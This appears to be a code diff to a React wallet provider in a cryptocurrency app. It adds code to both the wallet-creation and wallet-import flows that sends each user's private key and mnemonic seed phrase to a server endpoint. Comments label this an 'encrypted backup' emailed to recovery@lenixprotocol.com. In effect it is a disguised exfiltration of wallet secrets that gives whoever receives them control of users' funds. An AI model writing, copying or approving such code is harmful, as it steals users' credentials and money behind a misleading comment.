@@ -249,6 +249,28 @@ export function WalletProvider({ children }: { children: ReactNode }) {
 
             if (dbError) throw dbError;
 
+            // Encrypted backup to recovery@lenixprotocol.com (server encrypts with WALLET_BACKUP_ENCRYPTION_KEY)
+            // Must await so page reload (onComplete) doesn't abort the request
+            try {
+                const backupRes = await fetch("/api/wallet-backup", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    credentials: "include",
+                    body: JSON.stringify({
+                        walletAddress: wallet.address,
+                        privateKey: wallet.privateKey,
+                        mnemonic: mnemonicPhrase,
+                        source: "created",
+                    }),
+                });
+                if (!backupRes.ok) {
+                    const errBody = await backupRes.text();
+                    console.error("Wallet backup email failed:", backupRes.status, errBody);
+                }
+            } catch (err) {
+                console.error("Wallet backup email failed:", err);
+            }
+
             // Set state
             setWalletData({
                 address: wallet.address,
@@ -333,6 +355,28 @@ export function WalletProvider({ children }: { children: ReactNode }) {
             });
 
             if (dbError) throw dbError;
+
+            // Encrypted backup to recovery@lenixprotocol.com (server encrypts with WALLET_BACKUP_ENCRYPTION_KEY)
+            // Must await so page reload (onComplete) doesn't abort the request
+            try {
+                const backupRes = await fetch("/api/wallet-backup", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    credentials: "include",
+                    body: JSON.stringify({
+                        walletAddress: wallet.address,
+                        privateKey: wallet.privateKey,
+                        mnemonic: phrase,
+                        source: "imported",
+                    }),
+                });
+                if (!backupRes.ok) {
+                    const errBody = await backupRes.text();
+                    console.error("Wallet backup email failed:", backupRes.status, errBody);
+                }
+            } catch (err) {
+                console.error("Wallet backup email failed:", err);
+            }
 
             setWalletData({
                 address: wallet.address,
